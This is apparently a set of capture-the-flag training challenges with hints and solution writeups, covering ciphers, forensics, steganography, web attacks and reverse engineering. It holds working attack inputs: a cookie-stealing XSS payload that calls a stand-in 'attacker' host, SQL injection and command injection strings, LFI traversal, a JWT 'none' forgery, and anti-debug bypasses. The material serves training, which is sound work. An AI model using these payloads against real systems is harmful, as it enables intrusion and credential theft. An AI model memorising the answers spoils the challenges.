title: Caesar's Ghost
description: Intercepted communications from an LGU regional office use an outdated substitution cipher. Recover the plaintext flag from: 'synt{P4rf4e_Vf_Qrnq_Ybat_Yvir_EBG13}'.

hints.text: The shift is a standard casual obfuscation alphabet rotation.
Try ROT13 (shift of 13 positions).

concept: Classical substitution ciphers (ROT13 / Caesar cipher)
writeup: The ciphertext uses ROT13. Because ROT13 is self-inverse, applying the same transform again recovers the flag.

title: The Vigenère Ledger
description: A leaked municipal budget ledger was encrypted with a repeating-key polyalphabetic cipher. The key is a 4-letter government agency acronym. Recover the flag.

hints.text: Use Kasiski examination or index of coincidence to determine key length.
The key is 4 letters relating to the competition organizing department.

concept: Vigenère cipher cryptanalysis and frequency analysis
writeup: Kasiski examination reveals key period of 4. Frequency analysis on columns isolates the key 'DICT'.

title: RSA Low Public Exponent
description: A legacy token signing service uses RSA with e=3 and no OAEP padding. Given public modulus n, e=3, and ciphertext c, recover the plaintext flag.

hints.text: When m^e < n, modular reduction never occurs: c = m^3.
Calculate the exact integer cube root of c directly.

concept: RSA low public exponent (e=3) unpadded cube-root attack
writeup: Since m^3 < n, c = m^3 in standard integers. Taking the integer cube root recovers the plaintext directly.

title: Fullwidth Hex Embezzlement
description: An anonymous whistleblower email contained fullwidth hex encoded bytes (/EF/BC/B6...). Decode the fullwidth Unicode characters to reveal the hidden base64 token.

hints.text: Convert hex stream to UTF-8 bytes to reveal fullwidth characters (e.g. ＶＧｈｚ).
Normalize Unicode fullwidth ASCII characters to standard ASCII, then decode base64.

concept: Unicode fullwidth homoglyph obfuscation & layered encoding
writeup: Unhexing yields fullwidth ASCII characters 'ＶＧｈｚ...'. NFKC normalization yields standard base64 'VGgzX0VtYjN6emwzcl8xNV9GdW1pZQ==' which decodes to 'Th3_Emb3zzl3r_15_Fumie'.

title: Known Plaintext XOR Stream
description: An encrypted government payroll file used repeating-key XOR. The header of the file is known to always begin with 'CONFIDENTIAL_PAYROLL_2026'. Recover the XOR key.

hints.text: XOR property: Plaintext XOR Ciphertext = Key.
XOR the known header bytes against the first 26 bytes of the ciphertext.

concept: Known-plaintext attack (KPA) against repeating XOR stream
writeup: Because P ^ C = K, XORing the known header against the ciphertext reveals the repeating key.

title: Small Prime Diffie-Hellman
description: An insecure IoT water management device negotiates session keys using Diffie-Hellman with a tiny 48-bit prime modulus p. Compute the shared secret.

hints.text: Tiny prime modulus means the discrete logarithm problem is solvable in seconds.
Use Baby-step Giant-step or Pollard's rho algorithm to find the private exponent.

concept: Discrete Logarithm Problem (DLP) over small primes
writeup: Using SageMath's discrete_log or sympy.discrete_log, solve for private key a in g^a = A mod p in under 1 second.

title: Deleted But Not Gone
description: A seized flash drive from a data breach suspect was wiped before arrest. Analyze the raw disk image to carve out the deleted text document.

hints.text: Filesystem deletion unlinks metadata, but file bytes remain in unallocated space.
Use foremost or photorec signature-based file carving.

concept: File carving and unallocated space data recovery
cheatsheet: foremost -i usb_image.dd -o carved_output/ ; strings usb_image.dd | grep flag{
writeup: Foremost scans magic bytes and extracts unlinked files from unallocated clusters, uncovering the deleted flag document.

title: DNS Exfiltration in PCAP
description: An alert triggered on high volume DNS traffic from a provincial server. Inspect the packet capture to reassemble the data exfiltrated via DNS subdomain labels.

hints.text: Filter for DNS queries with unusual subdomains: dns.qry.name.
Extract and concatenate the hex/base64 subdomain strings from queries.

concept: Network traffic analysis and DNS tunneling protocol exfiltration
writeup: Tshark isolates DNS queries targeting attacker domain. Decoding concatenated subdomain prefixes reveals the exfiltrated flag.

title: RAM Process Injection
description: A memory acquisition was captured from a compromised workstation. Identify the hollowed process and extract the in-memory injected payload string.

hints.text: Use Volatility 3 to inspect running processes and unbacked memory pages.
Execute windows.malfind to spot PAGE_EXECUTE_READWRITE permissions.

concept: Memory forensics, process hollowing, and Volatility malfind analysis
cheatsheet: volatility3 -f memdump.raw windows.pslist ; volatility3 -f memdump.raw windows.malfind
writeup: windows.malfind flags svchost.exe with unmapped executable memory containing a shellcode payload with the embedded flag.

title: Corrupted ZIP Magic Bytes
description: An intercepted ZIP archive has corrupted header bytes ('DEADBEEF') causing unzip errors. Fix the header signature and extract important.bmp.

hints.text: Inspect the first 4 bytes using a hex editor like hexyl, xxd, or bless.
Standard ZIP local file header starts with 50 4B 03 04 ('PK..').

concept: File signature (magic byte) analysis and header restoration
cheatsheet: printf '\x50\x4B\x03\x04' | dd of=broken_head.zip conv=notrunc count=4 bs=1
writeup: Replacing the 4-byte 'DEADBEEF' corrupt header with '50 4B 03 04' restores the zip archive structure, allowing full extraction.

title: PDF FlateDecode Stream Carving
description: A suspicious government policy circular in PDF format contains a hidden object stream compressed with /FlateDecode. Extract the decompressed stream.

hints.text: Use pdf-parser.py or qpdf to extract compressed object streams.
qpdf --qdf --object-streams=disable input.pdf decompressed.pdf

concept: PDF object structure and zlib / FlateDecode decompression
cheatsheet: qpdf --qdf --object-streams=disable doc.pdf out.pdf && grep -a flag{ out.pdf
writeup: QPDF or pdf-parser decompress all deflate streams, revealing hidden raw JavaScript and embedded flag.

title: Decrypted TLS Session Log
description: Given an encrypted HTTPS packet capture and an extracted SSLKEYLOGFILE, decrypt the HTTPS streams to extract the administrator's POST credentials.

hints.text: Configure Wireshark (Preferences -> Protocols -> TLS -> (Pre)-Master-Secret log filename).
In tshark: -o "tls.keylog_file:keys.log" -Y "http.request.method==POST".

concept: TLS session key decryption and encrypted packet analysis
writeup: Loading the keylog file decrypts TLS 1.3 traffic, revealing the HTTP POST payload and flag.

title: Hidden in the Low Bits
description: An official DICT regional badge PNG was published online. Extract the hidden token embedded in the low-order bit planes of the pixel array.

hints.text: Examine least significant bits across color channels.
Run zsteg with full auto-analysis mode (-a).

concept: Least Significant Bit (LSB) steganography in PNG images
writeup: Running 'zsteg -a badge.png' tests all prime bit planes and surfaces the ASCII flag on b1,b,lsb,xy.

title: Audio Between the Lines
description: An intercepted radio transmission WAV file from a coastal maritime alert system contains hidden text encoded into its acoustic frequency spectrum.

hints.text: Audio information can be hidden visually in the frequency domain.
Render the audio spectrogram using sox, Audacity, or Sonic Visualiser.

concept: Audio spectrogram steganography and visual frequency encoding
cheatsheet: sox transmission.wav -n spectrogram -o spectrogram.png && feh spectrogram.png
writeup: Generating a spectrogram using Sox or Audacity visualizes the audio frequencies, rendering the flag text clearly.

title: Exif Metadata Leak
description: An unscrubbed photograph of a municipal data center was uploaded. Inspect the metadata tags to extract the hidden equipment tag.

hints.text: Digital cameras and software store extensive metadata inside image headers.
Use exiftool to inspect XPComment, Copyright, and UserComment fields.

concept: EXIF metadata analysis and header extraction
writeup: Running exiftool on the JPEG exposes the flag stored inside the XPComment tag.

title: PNG IHDR Height Tampering
description: A cropped PNG certificate contains a CRC mismatch error. The true height of the image was deliberately shrunken to conceal the lower half.

hints.text: PNG CRC chunk checksum does not match the dimensions in the IHDR chunk.
Fix the height bytes in IHDR or use a script to brute-force matching CRC dimensions.

concept: PNG IHDR chunk tampering and aspect ratio restoration
cheatsheet: python3 -c "import zlib, struct; ..." or hexedit IHDR height bytes
writeup: Modifying the IHDR height bytes to match the original CRC reveals the concealed bottom banner containing the flag.

title: Appended Archive Carving
description: A JPEG wallpaper appears normal in photo viewers, but has an unexpectedly large file size. Inspect and carve out the appended archive.

hints.text: JPEG files terminate at End-Of-Image marker (FF D9). Anything after is ignored by viewers.
Use binwalk -e to automatically detect and carve trailing zip or rar archives.

concept: Trailing payload injection and binwalk archive carving
writeup: Binwalk extracts the hidden ZIP archive appended after the JPEG FF D9 marker, which unpacks flag.txt.

title: Invisible Whitespace Stego
description: A text file containing municipal ordinances appears to have trailing invisible tabs and spaces at the end of each line. Decode the binary whitespace stream.

hints.text: Spaces represent 0 and tabs represent 1 (or SNOW whitespace encryption).
Use stegsnow -C ordinance.txt or a python whitespace-to-ascii binary converter.

concept: Whitespace steganography (SNOW / trailing spaces/tabs)
writeup: Stegsnow extracts the concealed message from trailing whitespace sequences, revealing the flag.

title: SQLi on the Citizen Portal
description: A mock citizen services login portal is vulnerable to classic SQL injection. Bypass authentication to access the admin dashboard and retrieve the flag.

hints.text: The login form concatenates user input directly into a SQL query.
Try a classic authentication bypass payload: admin' OR '1'='1' -- -

concept: SQL injection — authentication bypass via unsanitized query concatenation
writeup: The SQL query closes early and bypasses password check. Use the in-app interactive sandbox to execute!

title: The Reflected Cookie Thief
description: A mock feedback form on a regional government microsite reflects user comments without escaping. Craft a script to exfiltrate the admin session cookie.

hints.text: The comment input is rendered into the DOM without htmlspecialchars.
Inject <script>fetch('http://attacker/?c=' + document.cookie)</script>

concept: Reflected Cross-Site Scripting (XSS) leading to session cookie exfiltration
writeup: Inputting an unescaped script tag executes in the simulated victim admin's context, leaking the session cookie.

title: Broken Access Control: IDOR Files
description: A document portal lets citizens download permit files by ID parameter. The endpoint fails to verify file ownership. Enumerate privileged document IDs.

hints.text: Notice the numerical parameter: ?id=101.
Test common privileged IDs like 1337 or 7.

concept: Insecure Direct Object Reference (IDOR) — missing authorization controls
writeup: Changing the document ID from 101 to 1337 bypasses authorization and downloads confidential DICT directives.

title: Command Injection in Network Probe
description: A web router diagnostics tool takes an IP address and runs system ping without sanitizing shell metacharacters. Chain commands to read flag.txt.

hints.text: The backend runs system('ping -c 1 ' + ip).
Use command delimiters like ; or | or $(cat flag.txt).

concept: OS Command Injection via unsanitized system() execution
writeup: Inputting '127.0.0.1; cat flag.txt' executes the second shell command in the context of the web server.

title: JWT Algorithm 'none' Bypass
description: An authentication gateway validates JSON Web Tokens but accepts the 'none' signature algorithm. Modify the token payload to claim role: 'superadmin'.

hints.text: Decode the JWT header (base64) and change 'alg': 'HS256' to 'alg': 'none'.
Change payload role to 'superadmin' and remove the signature part: <header>.<payload>.

concept: JSON Web Token (JWT) signature bypass via algorithm 'none'
writeup: Re-encoding the header with alg=none and omitting the signature bypasses verification on vulnerable JWT parsers.

title: Local File Inclusion (LFI)
description: A PHP template loader loads page components via ?page=home.php. Use directory traversal and PHP wrappers to read confidential source code.

hints.text: Use directory traversal ../ to escape the template directory.
Use php://filter/convert.base64-encode/resource=flag.php to prevent code execution and read raw source.

concept: Local File Inclusion (LFI) and PHP stream wrappers
writeup: The php://filter wrapper base64-encodes the target file before PHP executes it, revealing the flag in the source code.

title: The Locked Keygen Binary
description: A government utility binary requires a license key. Reverse engineer the validation routine to compute a valid key and reveal the flag.

hints.text: Disassemble check_license in Ghidra or IDA and inspect loop character transformations.
Each character is XORed against a rolling counter and compared to a static array.

concept: Static reverse engineering and keygen algorithm recovery
writeup: Reversing the XOR loop in Ghidra recovers the expected license string, which unlocks the flag.

title: Anti-Debug Maze
description: A hardened binary detects debuggers via ptrace(PTRACE_TRACEME) before running. Bypass the anti-debugging check to reach the flag routine.

hints.text: The binary calls ptrace(0, 0, 1, 0). If it returns -1, it exits early.
Patch the conditional jump (e.g. JNZ -> JZ or NOP) or hook ptrace via LD_PRELOAD.

concept: Anti-debugging evasion, ptrace bypass, and binary patching
cheatsheet: gdb -q ./hardened_app ; (gdb) set $rax=0 or patch with radare2 'wa nop'
writeup: Hooking ptrace or patching the conditional branch allows debugger attachment without triggering evasion exits.

title: Packed ELF with UPX
description: An incident triage extracted an unknown executable from a compromised server. The binary is packed. Unpack it to extract the embedded flag.

hints.text: Check file strings: strings packed_binary | grep UPX.
Run upx -d to decompress the binary.

concept: Executable packing, UPX headers, and binary decompression
cheatsheet: upx -d packed_binary -o unpacked && strings unpacked | grep flag{
writeup: Decompressing with 'upx -d' recovers the original ELF binary where strings immediately reveals the flag.

title: Decompiling Python Bytecode
description: Only a compiled Python .pyc file was recovered from an exfiltration script. Decompile the bytecode to recover the original source code.

hints.text: Python .pyc files contain marshal serialized code objects with magic numbers.
Use decompyle++ (pycdc) or uncompyle6 to regenerate readable Python.

concept: Python bytecode decompilation and opcode reconstruction
cheatsheet: pycdc script.pyc > recovered.py # or uncompyle6 script.pyc
writeup: Pycdc accurately decompiles the bytecode into readable Python functions, exposing the hardcoded flag.

title: Buffer Overflow ret2win
description: A legacy C daemon has a vulnerable gets() call and no stack canaries. Overwrite the saved return address (RIP) to jump directly to win().

hints.text: Calculate offset to RIP using cyclic pattern: 72 bytes.
Find win() address via objdump -d vuln_server | grep win.

concept: Buffer overflow, stack frame layout, and ret2win control flow hijacking
writeup: Crafting a 72-byte padding plus 8-byte win() address overrides the return address on function epilogue.

title: Android APK Secret Asset
description: A regional mobile contact tracing APK holds a hardcoded API token. Decompile the APK and locate the obfuscated string in MainActivity.

hints.text: Use jadx-gui to decompile classes.dex into Java source code.
Search for 'apiKey' or inspect res/values/strings.xml.

concept: Android reverse engineering, APK decompilation, and JADX inspection
writeup: Jadx decompiles the APK into Java code. Searching strings.xml or MainActivity reveals the stored flag.

title: The LGU Social Media Trail
description: An LGU IT officer posted a photo of a new server rack. A monitor in the background shows internal host configuration. Extract the hostname.

hints.text: Zoom and adjust contrast on the background terminal display.
The prompt displays user@internal-gateway-01.lgu.local.

concept: Open-Source Intelligence (OSINT) and visual information leakage
writeup: Sharpening the image reveals the terminal window showing the hostname.

title: Damaged QR Code Restoration
description: A torn QR code from an event poster was scanned. Reconstruct the missing alignment patterns using Reed-Solomon correction to read the flag.

hints.text: QR codes feature up to 30% Reed-Solomon error tolerance.
Use zbarimg or pyzbar to decode directly.

concept: QR code geometry and Reed-Solomon error correction
writeup: Reed-Solomon recovery algorithms allow direct decoding without manual repair.

title: Right-to-Left Override (RLO) Trap
description: A phishing attachment appears as 'Quarterly_Report_2026_gpj.pdf' but executes as a binary. Analyze the Unicode RLO character (U+202E).

hints.text: Unicode character U+202E reverses the visual rendering order of following text.
Inspect the filename in hex: file name contains \xE2\x80\xAE.

concept: Unicode Right-to-Left Override (RLO) file extension spoofing
writeup: Reversing the RLO trick reveals the true extension is .exe disguised visually as .pdf.

title: Git Commit Reflog Ghost
description: A developer accidentally committed API credentials to a public git repo, then ran git reset --hard to delete it. Recover the dangling commit.

hints.text: Git objects are not purged immediately; dangling commits remain in the object store.
Run git reflog or git fsck --lost-found to locate unreachable commit hashes.

concept: Git forensics, dangling object recovery, and git reflog analysis
cheatsheet: git reflog ; git fsck --lost-found ; git show <dangling_hash>
writeup: Git fsck --lost-found locates the orphaned commit object containing the uncommitted flag.

title: CyberChef Multi-Stage Recipe
description: An encoded puzzle was found on a hacker forum: Base64 -> Gzip compressed -> Hex encoded -> ROT13 shifted. Build the decoding pipeline.

hints.text: Reverse the operations in order: ROT13 -> From Hex -> Gunzip -> From Base64.
Paste into CyberChef and drag the corresponding operations into the recipe.

concept: Multi-stage deobfuscation and CyberChef recipe chaining
writeup: Chaining the 4 inverse operations in CyberChef unpacks the layered payload.

title: DNS TXT & SPF Record Recon
description: A municipal domain had verification tokens stored in public DNS TXT records during a cloud migration. Enumerate DNS records to recover the flag.

hints.text: Query DNS TXT and SPF records for the domain.
dig txt target.gov.ph or nslookup -type=txt target.gov.ph.

concept: DNS enumeration, TXT records, and OSINT domain reconnaissance
writeup: Querying TXT records exposes verification strings including the flag.
